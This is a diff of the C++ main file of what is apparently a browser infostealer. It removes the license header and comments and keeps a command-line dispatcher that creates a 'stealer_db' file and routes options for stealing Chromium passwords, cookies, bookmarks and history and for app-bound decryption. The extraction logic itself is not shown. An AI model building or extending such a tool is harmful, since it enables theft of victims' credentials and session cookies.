@@ -1,22 +1,4 @@
-/*
- * © 2025 Shayan Ahmed Khan - shaddy43
- *
- * This software is provided under the MIT License.
- * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
- * and associated documentation files (the "Software"), to deal in the Software without restriction,
- * including without limitation the rights to use, copy, modify, merge, publish, distribute,
- * sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in all copies or
- * substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
- * BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
- * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
- * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
- */
+
 
 #include "includes/Visualizer.h"
 std::string stealer_db;
@@ -25,15 +7,12 @@ void init_stealer_db()
 {
 	std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 
-	srand(time(0)); // Seed the random number generator with current time
+	srand(time(0));
 	for (int i = 0; i < 6; ++i) {
 		stealer_db += characters[rand() % characters.length()];
 	}
 
-	//std::filesystem::path temp_path = std::filesystem::temp_directory_path();
-	//stealer_db = temp_path.string() + stealer_db;
 
-    //saving stealer db in current working directory instead of temp
     std::filesystem::path db_path = std::filesystem::current_path();
     stealer_db = db_path.string() + "\\" + stealer_db + ".db";
 }
@@ -60,7 +39,7 @@ int main(int argc, char* argv[])
         visualizer.displayHelp();
     }
     else if (std::string(argv[1]) == "-pass") {
-        // Handle -pass options
+
         if (argc > 2) {
             if (std::string(argv[2]) == "-c") {
                 std::cout << "Target Chromium Browser passwords...\n";
@@ -80,7 +59,7 @@ int main(int argc, char* argv[])
         }
     }
     else if (std::string(argv[1]) == "-cookies") {
-        // Handle -cookies options
+
         if (argc > 2) {
             if (std::string(argv[2]) == "-c") {
                 std::cout << "Target Chromium Browser cookies...\n";
@@ -100,7 +79,7 @@ int main(int argc, char* argv[])
         }
     }
     else if (std::string(argv[1]) == "-bookmarks") {
-        // Handle -bookmark options
+
         if (argc > 2) {
             if (std::string(argv[2]) == "-c") {
                 std::cout << "Target Chromium Browser bookmarks...\n";
@@ -120,7 +99,7 @@ int main(int argc, char* argv[])
         }
     }
     else if (std::string(argv[1]) == "-history") {
-        // Handle -bookmark options
+
         if (argc > 2) {
             if (std::string(argv[2]) == "-c") {
                 std::cout << "Target Chromium Browser history...\n";
@@ -140,7 +119,7 @@ int main(int argc, char* argv[])
         }
     }
     else if (std::string(argv[1]) == "-greed") {
-        //Handle -greed
+
         visualizer.handler(13, "");
     }
     else if (std::string(argv[1]) == "-app-bound-decryption")
@@ -157,7 +136,7 @@ int main(int argc, char* argv[])
             else
             {
                 std::cout << "Invalid option for -app-bound-decryption. Use -h for help.\n";
-            } 
+            }
         }
         else
         {
